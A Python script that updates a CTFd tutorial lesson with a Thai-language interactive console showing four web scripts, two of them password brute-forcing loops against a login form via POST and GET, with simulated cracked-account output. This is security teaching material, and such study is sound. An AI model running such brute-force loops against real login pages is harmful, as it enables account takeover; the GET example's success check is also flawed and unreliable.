import json
from CTFd import create_app
from CTFd.plugins.tutorials import TutorialLesson

app = create_app()
ctx = app.app_context()
ctx.push()
db = app.db

l171 = db.session.query(TutorialLesson).filter_by(id=171).first()
blocks = json.loads(l171.content)

# ─── Upgrade Block 3 of Lesson 171 to include Live Flow Terminal Simulation ───
blocks[3]['value'] = """### 💻 Web Vulnerability Coding Console (วิเคราะห์ 4 ตัวอย่างโค้ดเว็บ)

คลิกหัวข้อด้านซ้ายมือเพื่อตรวจสอบตัวอย่างโค้ดการจัดการคำขอเว็บ และ **กดปุ่มรันจำลองการทำงานจริง (Run Simulation)** เพื่อประเมินผลลัพธ์ผ่านเทอร์มินัลระบบ:

<style>
.w-sandbox-main{display:flex;gap:20px;margin:2rem auto;max-width:1050px;}
@media(max-width:820px){.w-sandbox-main{flex-direction:column;}}

.w-sandbox-nav{width:220px;display:flex;flex-direction:column;gap:6px;flex-shrink:0;}
@media(max-width:820px){.w-sandbox-nav{width:100%;flex-direction:row;flex-wrap:wrap;}}
.w-nav-item{padding:8px 12px;background:rgba(255,255,255,0.015);border:1px solid rgba(255,255,255,0.04);border-radius:6px;font-size:0.75rem;color:#cbd5e1;cursor:pointer;text-align:left;transition:all 0.15s ease;}
.w-nav-item:hover, .w-nav-item.active{border-color:#00f0ff;color:#ffffff;background:rgba(0,240,255,0.04);}
.w-nav-item.active{font-weight:bold;box-shadow:0 0 8px rgba(0,240,255,0.1);}

.w-sandbox-panels{flex:1;display:flex;flex-direction:column;gap:14px;}
.w-sand-panel{display:none;background:#05070f;border:1px solid rgba(255,255,255,0.08);border-radius:10px;padding:20px;box-shadow:0 8px 24px rgba(0,0,0,0.45);box-sizing:border-box;}
.w-sand-panel.active{display:block !important;}

.w-sand-hdr{font-size:0.95rem;font-weight:800;color:#ffffff;border-bottom:1px solid rgba(255,255,255,0.06);padding-bottom:10px;margin-bottom:14px;display:flex;justify-content:between;align-items:center;}
.w-sand-hdr span.tag{font-size:0.65rem;padding:2px 8px;border-radius:4px;background:rgba(0,240,255,0.08);border:1px solid rgba(0,240,255,0.2);color:#00f0ff;font-family:'JetBrains Mono',monospace;}
.w-sand-code{font-family:'JetBrains Mono',monospace;font-size:0.8rem;color:#00f0ff;white-space:pre-wrap;margin:0 0 12px;background:rgba(0,0,0,0.2);padding:14px;border-radius:8px;border:1px solid rgba(255,255,255,0.02);}

/* Terminal box */
.w-sand-term-container{position:relative;background:#02040a;border:1px solid rgba(255,255,255,0.06);border-radius:8px;margin-bottom:16px;box-shadow:inset 0 2px 8px rgba(0,0,0,0.9);overflow:hidden;}
.w-sand-term-bar{background:rgba(255,255,255,0.03);padding:6px 12px;border-bottom:1px solid rgba(255,255,255,0.05);display:flex;justify-content:space-between;align-items:center;}
.w-sand-term-title{font-size:0.65rem;color:#64748b;font-weight:800;letter-spacing:0.06em;font-family:'JetBrains Mono',monospace;}
.w-sand-term-btn{background:rgba(0,240,255,0.1);border:1px solid rgba(0,240,255,0.3);border-radius:4px;color:#00f0ff;font-size:0.68rem;padding:3px 8px;cursor:pointer;font-family:'JetBrains Mono',monospace;font-weight:700;transition:all 0.15s ease;display:flex;align-items:center;gap:4px;}
.w-sand-term-btn:hover{background:#00f0ff;color:#02040a;box-shadow:0 0 8px rgba(0,240,255,0.4);}
.w-sand-term{font-family:'JetBrains Mono',monospace;font-size:0.76rem;color:#a7f3d0;padding:12px 16px;white-space:pre-wrap;min-height:90px;}
.w-sand-term span.prompt{color:#3ddc84;}
.w-sand-term span.cmd{color:#ffffff;font-weight:bold;}

.w-sand-expl{background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.05);border-radius:8px;padding:16px;font-size:0.83rem;color:#cbd5e1;line-height:1.65;}
.w-sand-expl h5{margin:0 0 8px;font-size:0.85rem;color:#fbbf24;font-weight:bold;}
.w-sand-expl p{margin:0 0 10px;}
.w-sand-expl p:last-child{margin-bottom:0;}
.w-sand-expl ul{margin:0;padding-left:20px;}
.w-sand-expl li{margin-bottom:6px;}
.w-sand-expl strong{color:#ffffff;}
</style>

<div class="w-sandbox-main">
<!-- Navigation Left Side -->
<div class="w-sandbox-nav">
<button id="nav-item-readhtml" class="w-nav-item active" onclick="showSandboxItem('readhtml', this)">1. Reading HTML & BeautifulSoup</button>
<button id="nav-item-readheaders" class="w-nav-item" onclick="showSandboxItem('readheaders', this)">2. Read HTTP Headers</button>
<button id="nav-item-postbrute" class="w-nav-item" onclick="showSandboxItem('postbrute', this)">3. POST Login Brute-forcing</button>
<button id="nav-item-getbrute" class="w-nav-item" onclick="showSandboxItem('getbrute', this)">4. GET Login Brute-forcing</button>
</div>

<!-- Panel details right side -->
<div class="w-sandbox-panels">

<!-- 1. Reading HTML -->
<div id="panel-readhtml" class="w-sand-panel">
<div class="w-sand-hdr"><span>1. Reading HTML & BeautifulSoup</span> <span class="tag">Python</span></div>
<pre class="w-sand-code">import requests
from bs4 import BeautifulSoup

url = "https://example.com"
response = requests.get(url)
html_content = response.text

soup = BeautifulSoup(html_content, "lxml")
print("Page Title:", soup.title.string)
print(soup.prettify())</pre>
<div class="w-sand-term-container">
<div class="w-sand-term-bar">
<span class="w-sand-term-title">🐚 Terminal Console</span>
<button class="w-sand-term-btn" onclick="startWebSim('readhtml')">▶ Run Simulation</button>
</div>
<div id="term-readhtml" class="w-sand-term"><span class="prompt">kali@kali:~/Desktop$</span> [กดปุ่ม Run Simulation ด้านขวาบนเพื่อจำลองการเรียกใช้งาน]</div>
</div>
<div class="w-sand-expl">
<h5>🔒 Security & Code Analysis</h5>
<p>สคริปต์สแกนดึงข้อมูลเว็บเพจภายนอกเพื่อวิเคราะห์และถอดโครงสร้าง:</p>
<ul>
<li><strong>BeautifulSoup(html_content, "lxml")</strong>: เรียกใช้ตัววิเคราะห์ไวยากรณ์ (HTML Parser) เพื่อสกัดข้อมูลเฉพาะส่วนที่ต้องการ</li>
</ul>
</div>
</div>

<!-- 2. Read Headers -->
<div id="panel-readheaders" class="w-sand-panel">
<div class="w-sand-hdr"><span>2. Read HTTP Headers</span> <span class="tag">Python</span></div>
<pre class="w-sand-code">import requests
response = requests.get('https://www.example.com')
for key, value in response.headers.items():
    print(f"{key}: {value}")</pre>
<div class="w-sand-term-container">
<div class="w-sand-term-bar">
<span class="w-sand-term-title">🐚 Terminal Console</span>
<button class="w-sand-term-btn" onclick="startWebSim('readheaders')">▶ Run Simulation</button>
</div>
<div id="term-readheaders" class="w-sand-term"><span class="prompt">kali@kali:~/Desktop$</span> [กดปุ่ม Run Simulation ด้านขวาบนเพื่อจำลองการเรียกใช้งาน]</div>
</div>
<div class="w-sand-expl">
<h5>🔒 Security & Code Analysis</h5>
<p>สคริปต์สแกนวิเคราะห์ HTTP Response Headers เพื่อประเมินความปลอดภัยของเว็บเซิร์ฟเวอร์:</p>
<ul>
<li><strong>Security Analysis</strong>: ตรวจสอบความปลอดภัยระดับระบบ เช่น ป้องกันการโจมตี Clickjacking หรือดักอ่านพฤติกรรมผ่านฟิลด์ HTTP Headers</li>
</ul>
</div>
</div>

<!-- 3. POST Login Brute-forcing -->
<div id="panel-postbrute" class="w-sand-panel">
<div class="w-sand-hdr"><span>3. POST Login Brute-forcing</span> <span class="tag">Python</span></div>
<pre class="w-sand-code">import requests
url = "http://example.com/login"
wordlist = ["admin", "password", "123456", "qwerty"]
for password in wordlist:
    response = requests.post(url, data={"username": "admin", "password": password})
    if "Login failed" not in response.text:
        print(f"Success! Password: {password}")
        break</pre>
<div class="w-sand-term-container">
<div class="w-sand-term-bar">
<span class="w-sand-term-title">🐚 Terminal Console</span>
<button class="w-sand-term-btn" onclick="startWebSim('postbrute')">▶ Run Simulation</button>
</div>
<div id="term-postbrute" class="w-sand-term"><span class="prompt">kali@kali:~/Desktop$</span> [กดปุ่ม Run Simulation ด้านขวาบนเพื่อจำลองการเรียกใช้งาน]</div>
</div>
<div class="w-sand-expl">
<h5>🔒 Security & Code Analysis</h5>
<p>สคริปต์เดารหัสผ่านผ่านฟอร์มเข้าสู่ระบบด้วยเมธอดส่งข้อมูลแบบ POST:</p>
<ul>
<li><strong>POST Method</strong>: สลัดการยื่นส่งข้อมูลใน Body ทำให้ข้อมูลลับไม่รั่วไหลไปกับ URL</li>
</ul>
</div>
</div>

<!-- 4. GET Login Brute-forcing -->
<div id="panel-getbrute" class="w-sand-panel">
<div class="w-sand-hdr"><span>4. GET Login Brute-forcing</span> <span class="tag">Python</span></div>
<pre class="w-sand-code">import requests
url = "http://example.com/login"
usernames = ["admin", "user", "test"]
passwords = ["12345", "password", "admin123"]

for username in usernames:
    for password in passwords:
        params = {"username": username, "password": password}
        response = requests.get(url, params=params)
        if "Welcome" in response.text or response.status_code == 200:
            print(f"Success! Username: {username} | Password: {password}")
            break</pre>
<div class="w-sand-term-container">
<div class="w-sand-term-bar">
<span class="w-sand-term-title">🐚 Terminal Console</span>
<button class="w-sand-term-btn" onclick="startWebSim('getbrute')">▶ Run Simulation</button>
</div>
<div id="term-getbrute" class="w-sand-term"><span class="prompt">kali@kali:~/Desktop$</span> [กดปุ่ม Run Simulation ด้านขวาบนเพื่อจำลองการเรียกใช้งาน]</div>
</div>
<div class="w-sand-expl">
<h5>🔒 Security & Code Analysis</h5>
<p>สคริปต์โจมตีเดารหัสผ่านโดยใช้วิธีแนบตัวแปรไปกับพาธที่อยู่ URL ด้วยเมธอด GET:</p>
<ul>
<li><strong>GET Parameters</strong>: ค่าข้อมูลลับจะไปปรากฏและบันทึกค้างไว้บน Web Server logs หรือประวัติ Browser history</li>
</ul>
</div>
</div>

</div>
</div>

<script>
window.showSandboxItem = function(itemKey, element) {
  const items = document.querySelectorAll('.w-sandbox-nav .w-nav-item');
  items.forEach(i => i.classList.remove('active'));
  element.classList.add('active');

  const panels = document.querySelectorAll('.w-sand-panel');
  panels.forEach(p => {
    p.style.setProperty('display', 'none', 'important');
  });

  const targetPanel = document.getElementById('panel-' + itemKey);
  if (targetPanel) {
    targetPanel.style.setProperty('display', 'block', 'important');
  }
}

// Auto render
setTimeout(() => {
  const activeBtn = document.querySelector('.w-sandbox-nav .w-nav-item.active');
  if (activeBtn) { activeBtn.click(); }
}, 100);

// Web Terminal Simulation
window.startWebSim = function(itemKey) {
  const term = document.getElementById('term-' + itemKey);
  if (!term) return;

  term.innerHTML = '<span class="prompt">kali@kali:~/Desktop$</span> <span class="cmd">Sending HTTP request...</span>\\n[.] Resolving example.com\\n[.] Reading response...';

  setTimeout(() => {
    if (itemKey === 'readhtml') {
      term.innerHTML = '<span class="prompt">kali@kali:~/Desktop$</span> <span class="cmd">python3 parse_title.py</span>\\nPage Title: Example Domain\\n&lt;!DOCTYPE html&gt;\\n&lt;html&gt;\\n&lt;head&gt;\\n  &lt;title&gt;Example Domain&lt;/title&gt;\\n...';
    } else if (itemKey === 'readheaders') {
      term.innerHTML = '<span class="prompt">kali@kali:~/Desktop$</span> <span class="cmd">python3 get_headers.py</span>\\nContent-Type: text/html; charset=UTF-8\\nServer: ECS (sec/9482)\\nCache-Control: max-age=604800\\n<span style="color:#00f0ff;">X-Frame-Options: DENY</span>\\n<span style="color:#3ddc84;">Content-Security-Policy: default-src \\'self\\'</span>';
    } else if (itemKey === 'postbrute') {
      term.innerHTML = '<span class="prompt">kali@kali:~/Desktop$</span> <span class="cmd">python3 post_brute.py</span>\\n[!] Attempt: admin | admin -&gt; FAILED\\n[!] Attempt: admin | password -&gt; FAILED\\n<span style="color:#3ddc84; font-weight:bold;">[+] Success! Password Found: 123456</span>';
    } else if (itemKey === 'getbrute') {
      term.innerHTML = '<span class="prompt">kali@kali:~/Desktop$</span> <span class="cmd">python3 get_brute.py</span>\\n[!] GET /login?username=admin&password=12345 -&gt; 401 Unauthorized\\n[!] GET /login?username=admin&password=password -&gt; 401 Unauthorized\\n<span style="color:#3ddc84; font-weight:bold;">[+] Success! Account Cracked: Username: admin | Password: admin123</span>';
    }
  }, 1000);
}
</script>"""

l171.content = json.dumps(blocks, ensure_ascii=False)
db.session.query(TutorialLesson).filter_by(id=171).update({"content": l171.content})
db.session.commit()
print("Lesson 171 Live Terminal Simulation successfully integrated!")
ctx.pop()
